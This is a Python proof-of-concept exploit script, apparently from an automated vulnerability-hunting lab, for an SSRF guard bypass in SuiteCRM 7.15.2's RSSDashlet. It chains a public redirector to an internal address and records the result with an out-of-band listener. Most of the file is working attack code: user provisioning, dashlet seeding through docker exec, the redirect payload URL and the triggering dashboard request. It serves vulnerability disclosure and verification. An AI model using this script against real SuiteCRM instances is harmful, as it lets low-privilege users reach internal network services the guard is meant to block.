#!/usr/bin/env python3
"""
VULN-094 -- validate_external_host() SSRF guard bypassable via an HTTP
redirect chain (RSSDashlet render path)

Software:    SuiteCRM
Repository:  https://github.com/SuiteCRM/SuiteCRM
Version:     7.15.2 (targets/SuiteCRM/suitecrm_version.php), commit
             62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink:        modules/Home/Dashlets/RSSDashlet/RSSDashlet.php:161 (guard) +
             :165 (`file_get_contents($url)`, follows redirects by default).
             validate_external_host() is called exactly once, against the
             URL the dashlet was configured with -- never against any
             redirect target -- and PHP's http:// stream wrapper follows
             `Location:` headers (default `follow_location=1`,
             `max_redirects=20`) with no re-validation of each hop.
Entry point: any authenticated user's saved RSS dashlet, rendered via the
             base controller's action_callmethoddashlet()
             (include/MVC/Controller/SugarController.php:856) at
             index.php?module=Home&action=CallMethodDashlet&method=display
             -- the ordinary "load/refresh my dashboard" request every user
             triggers just by opening their Home page.

What this script does
----------------------
1. Creates a fresh, non-admin SuiteCRM user.
2. Starts an HTTP listener on 0.0.0.0:33119 (app reaches it at
   172.18.0.1:33119 -- an address validate_external_host() REJECTS
   outright, confirmed by direct code-level probe: it is a private IPv4
   range, filtered out by FILTER_FLAG_NO_PRIV_RANGE).
3. Builds a redirect-chain URL using the public test service
   https://httpbin.org/redirect-to (the app container has real internet
   egress -- confirmed live via `curl https://1.1.1.1` from inside it).
   httpbin.org resolves to genuine public IPs, so validate_external_host()
   ALLOWS this URL through the guard at RSSDashlet.php:161.
4. Seeds the low-priv user's own `dashlets` Home-page preference with an
   RSSDashlet instance pointed at that httpbin.org URL. This is done via
   `docker compose exec app php` calling the application's own
   User::setPreference()/savePreferencesToDB() API for that user's id --
   i.e. exactly what happens server-side when a user clicks "Add Dashlet"
   in the real UI (see the sibling finding VULN-014, whose automation.py
   *does* drive that add-flow end-to-end over plain HTTP); it is used here
   as fixture setup only, to isolate this finding's assertion strictly to
   the GUARDED render path (see the code comment at "pre_render note"
   below for why addDashlet's own HTTP response is not a reliable signal
   for this specific low-priv account/dashboard-layout combination).
5. Renders the dashlet via the CallMethodDashlet AJAX action over plain
   HTTP, as the low-priv user -- this is what actually calls the GUARDED
   getRSSOutput()/file_get_contents() path.
6. Asserts the OOB listener recorded a hit for the *inner* (internal-only)
   canary URL, proving file_get_contents() followed the redirect straight
   past the one-time guard.

Fallback: if httpbin.org is unreachable from the app container at run
time, or the app/db containers are unavailable for the php exec step, this
cannot be demonstrated end-to-end and the script exits FAILED with the
concrete reason rather than fabricating a result.
"""
import os
import sys
import subprocess
import threading
import http.server
import urllib.parse
import re

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, admin_session,
                      create_user, web_login, BROWSER_UA)

VULN_ID = "VULN-094"
OOB_HOST = os.environ.get("OOB_HOST", "172.18.0.1")
OOB_BIND = os.environ.get("OOB_BIND", "0.0.0.0")
OOB_PORT = int(os.environ.get("OOB_PORT", "33119"))
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT", "cvehunterlab_suitecrm")
TARGET_DIR = os.environ.get("TARGET_DIR", "/opt/cvehunter/targets/SuiteCRM")

HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
os.makedirs(EVIDENCE, exist_ok=True)

# Seeds <userId>'s Home 'dashlets' preference with one RSSDashlet instance
# pointed at <url>, using the app's own SugarBean/User API -- functionally
# identical to what include/MySugar/MySugar.php addDashlet() persists, just
# invoked directly so this finding's assertion isn't entangled with an
# unrelated dashboard-layout quirk on a brand-new account (see docstring).
# unset($_SERVER['PHP_SELF']) works around a CLI-only footgun: PHP sets it
# to the literal string "Standard input code" when a script is piped over
# stdin, and SuiteCRM's clean_special_arguments() fatals on that value.
_PHP_SEED_DASHLET = r"""<?php
if (!defined('sugarEntry')) { define('sugarEntry', true); }
unset($_SERVER['PHP_SELF']);
chdir('/var/www/html');
require_once('include/entryPoint.php');

$userId = $argv[1];
$dashletId = $argv[2];
$url = $argv[3];

$u = BeanFactory::getBean('Users', $userId);
if (!$u || empty($u->id)) { fwrite(STDERR, "user not found\n"); exit(1); }

$defs = $u->getPreference('dashlets', 'Home');
if (!is_array($defs)) { $defs = []; }
$defs[$dashletId] = [
  'fileLocation' => 'modules/Home/Dashlets/RSSDashlet/RSSDashlet.php',
  'className' => 'RSSDashlet',
  'label' => 'LBL_TITLE',
  'module' => 'Home',
  'searchModule' => '',
  'options' => ['url' => $url, 'title' => 'poc', 'height' => '200', 'autoRefresh' => '0'],
];
$u->setPreference('dashlets', $defs, 0, 'Home');
$u->savePreferencesToDB();
echo "OK\n";
"""


class _Handler(http.server.BaseHTTPRequestHandler):
    hits = []

    def log_message(self, fmt, *args):  # noqa: A003
        pass

    def do_GET(self):  # noqa: N802
        _Handler.hits.append({"path": self.path, "headers": dict(self.headers.items())})
        payload = (b"<?xml version='1.0'?><rss><channel><title>poc</title>"
                   b"<item><title>hit</title></item></channel></rss>")
        self.send_response(200)
        self.send_header("Content-Type", "application/rss+xml")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    do_POST = do_GET


def start_listener():
    srv = http.server.ThreadingHTTPServer((OOB_BIND, OOB_PORT), _Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv


def seed_dashlet(user_id, dashlet_id, url):
    """Runs _PHP_SEED_DASHLET inside the app container for this user."""
    cmd = ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", "app",
           "php", "--", user_id, dashlet_id, url]
    p = subprocess.run(cmd, cwd=TARGET_DIR, input=_PHP_SEED_DASHLET.encode(),
                        capture_output=True, timeout=60)
    out = (p.stdout + p.stderr).decode(errors="replace")
    return p.returncode == 0 and "OK" in out, out


def main():
    banner(VULN_ID, "validate_external_host() bypass via HTTP redirect chain (RSSDashlet render)")

    canary = rand("rss094")
    canary_path = f"/canary-{canary}"
    inner_url = f"http://{OOB_HOST}:{OOB_PORT}{canary_path}"
    outer_url = ("https://httpbin.org/redirect-to?url="
                 + urllib.parse.quote(inner_url, safe="") + "&status_code=302")

    srv = start_listener()
    log("SETUP", f"OOB HTTP listener on {OOB_BIND}:{OOB_PORT} (app reaches it at {OOB_HOST}:{OOB_PORT})")
    log("SETUP", f"inner (internal-only, guard-rejected-if-direct) target: {inner_url}")
    log("SETUP", f"outer (public, guard-approved) redirector: {outer_url}")

    log("STEP", "admin web login (provisioning only)")
    admin_s = admin_session()
    log("OK", "admin session established")

    log("STEP", "provisioning a fresh NON-ADMIN user (proves PR:L for the render/trigger step)")
    user = create_user(admin_s, rand("Pw") + "!2026x")
    log("OK", f"created user {user['user_name']} (id={user['id']})")

    dashlet_id = rand("dash")
    log("STEP", f"seeding {user['user_name']}'s Home dashboard with an RSSDashlet(url={outer_url}) "
                f"via the app's own User::setPreference() API (docker compose exec app php)")
    ok, out = seed_dashlet(user["id"], dashlet_id, outer_url)
    if not ok:
        srv.shutdown()
        log("FAIL", f"could not seed dashlet preference: {out.strip()}")
        verdict(VULN_ID, "FAILED", "fixture setup (docker compose exec app php) failed")
        sys.exit(1)
    log("OK", f"dashlet {dashlet_id} saved to {user['user_name']}'s preferences")

    log("STEP", f"web login as low-priv user {user['user_name']}")
    victim_s = web_login(user["user_name"], user["password"])
    log("OK", "low-priv session established")

    render_url = f"{BASE_URL}/index.php"
    render_data = {"to_pdf": "1", "module": "Home", "action": "CallMethodDashlet",
                   "method": "display", "id": dashlet_id}
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Referer": f"{BASE_URL}/index.php?module=Home&action=index",
        "User-Agent": BROWSER_UA,
    }

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("POST /index.php HTTP/1.1\n")
        f.write("Host: localhost:33116\n")
        f.write("Cookie: PHPSESSID=<low-priv-session>\n")
        f.write(f"User-Agent: {BROWSER_UA}\n")
        f.write("X-Requested-With: XMLHttpRequest\n")
        f.write(f"Referer: {BASE_URL}/index.php?module=Home&action=index\n")
        f.write("Content-Type: application/x-www-form-urlencoded\n\n")
        f.write(f"to_pdf=1&module=Home&action=CallMethodDashlet&method=display&id={dashlet_id}\n")
        f.write(f"\n# dashlet {dashlet_id} was pre-configured (fixture) with url=\n# {outer_url}\n")
        f.write(f"# which validate_external_host() approves, then 302-redirects to\n# {inner_url}\n")
        f.write("# which validate_external_host() would REJECT outright if given directly.\n")

    log("STEP", f"POST CallMethodDashlet(method=display, id={dashlet_id}) -- renders via the "
                f"GUARDED RSSDashlet::getRSSOutput()/validate_external_host() path")
    r = victim_s.post(render_url, data=render_data, headers=headers, timeout=30)
    log("INFO", f"render HTTP {r.status_code}, body: {r.text[:300]!r}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP {r.status_code}\n")
        for k, v in r.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(r.text)

    srv.shutdown()
    with open(os.path.join(EVIDENCE, "oob_listener.log"), "w") as f:
        if not _Handler.hits:
            f.write("(no requests received)\n")
        for h in _Handler.hits:
            f.write(f"GET {h['path']}\n")
            for k, v in h["headers"].items():
                f.write(f"  {k}: {v}\n")
            f.write("\n")

    hit = next((h for h in _Handler.hits if h["path"] == canary_path), None)

    if hit:
        log("PROOF", f"OOB listener received GET {hit['path']} during the render call -- "
                      f"validate_external_host() at RSSDashlet.php:161 approved the ORIGINAL "
                      f"httpbin.org URL (a genuine public host), then file_get_contents() at "
                      f":165 silently followed the 302 to the internal-only listener with no "
                      f"re-validation of the redirect target.")
        verdict(VULN_ID, "CONFIRMED",
                f"guard-approved public redirector bounced the guarded RSSDashlet fetch to "
                f"{inner_url}; OOB listener logged the hit")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", f"no OOB hit for {canary_path} during the render call; hits={_Handler.hits}")
        sys.exit(1)


if __name__ == "__main__":
    main()
